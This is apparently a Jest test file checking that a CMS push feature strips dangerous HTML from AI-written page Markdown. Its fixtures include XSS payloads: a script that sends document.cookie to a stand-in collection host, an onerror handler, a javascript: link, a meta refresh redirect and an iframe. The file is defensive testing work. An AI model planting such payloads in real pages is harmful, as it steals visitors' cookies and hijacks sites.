/**
 * executeCmsPush — the HTML written into a CMS draft (and later published as a
 * public page) is sanitized. AI-authored page Markdown must never plant live
 * script, event handlers, `javascript:` links, frames or forms on a customer's
 * site (Matrx Alchemy T21).
 *
 * The break this guards: `marked.parse` output handed to `saveDraft` as-is.
 * CmsPageService is the network seam and is doubled; the conversion is the
 * SUT and runs for real.
 */
const saveDraft = jest.fn();
jest.mock("@/features/cms/services/cmsService", () => ({
  CmsPageService: {
    saveDraft: (...args: unknown[]) => saveDraft(...args),
    setWebPageLink: jest.fn(),
    createPage: jest.fn(),
  },
}));
jest.mock("@/features/marketing/content-plan/data/service", () => ({
  getPlanNode: jest.fn(),
  updatePlanNode: jest.fn(),
}));
jest.mock("@/features/scopes/service/categoriesService", () => ({
  categoriesService: {},
}));

import type { ClientPageSummary } from "@/features/cms/types";
import type { MarketingPage } from "@/features/marketing/types";
import { executeCmsPush } from "@/features/marketing/lib/push-to-cms";

const page = { id: "3f6c1b8e-2a4d-4c1e-9b7a-5d2e8f1a0c34", path: "/services/solar-install" } as MarketingPage;
const target = {
  kind: "existing" as const,
  matchedBy: "link" as const,
  page: { id: "8b1e4d2c-7f3a-4e6b-a1c9-0d5f2e7b3a61", route: "/services/solar-install" } as ClientPageSummary,
};

async function pushedHtml(contentMarkdown: string): Promise<string> {
  saveDraft.mockResolvedValue({ id: target.page.id });
  await executeCmsPush({
    cmsSiteId: "c2a7e9f1-4b3d-4f8e-8a6c-1e9d7b5f3a20",
    target,
    page,
    payload: { contentMarkdown, metaTitle: null, metaDescription: null },
  });
  const [, draft] = saveDraft.mock.calls.at(-1) as [string, { htmlContent: string }];
  return draft.htmlContent;
}

beforeEach(() => saveDraft.mockReset());

describe("executeCmsPush writes sanitized HTML into the CMS draft", () => {
  it.each([
    ["script tag", "## Solar installs\n\n<script>document.location='https://collect.example/'+document.cookie</script>\n\nFree quotes in 24 hours.", /<script/i, "Free quotes in 24 hours."],
    ["onerror attribute", '<img src="/media/roof-array.jpg" onerror="alert(document.domain)">', /onerror/i, "/media/roof-array.jpg"],
    ["javascript: link", "[Book a site survey](javascript:alert(1))", /javascript:/i, "Book a site survey"],
    ["meta refresh redirect", '<meta http-equiv="refresh" content="0;url=https://collect.example">\n\nOur installers are certified.', /<meta|http-equiv/i, "Our installers are certified."],
    ["iframe", '<iframe src="https://collect.example/overlay"></iframe>\n\nServing Orange County.', /<iframe/i, "Serving Orange County."],
  ])("%s", async (_label, markdown, forbidden, survivor) => {
    const html = await pushedHtml(markdown);
    expect(html).not.toMatch(forbidden);
    expect(html).toContain(survivor);
  });

  it.each([
    ["heading", "## Residential solar", "<h2>Residential solar</h2>"],
    ["table", "| System | kW |\n| --- | --- |\n| Starter | 6.4 |", "<td>6.4</td>"],
    ["link", "[Get a quote](https://example-solar.com/quote)", '<a href="https://example-solar.com/quote">Get a quote</a>'],
    ["task list", "- [x] Permit filed\n- [ ] Panels installed", /<input checked(="")? disabled(="")? type="checkbox">/],
  ])("keeps %s", async (_label, markdown, expected) => {
    expect(await pushedHtml(markdown)).toMatch(expected);
  });
});
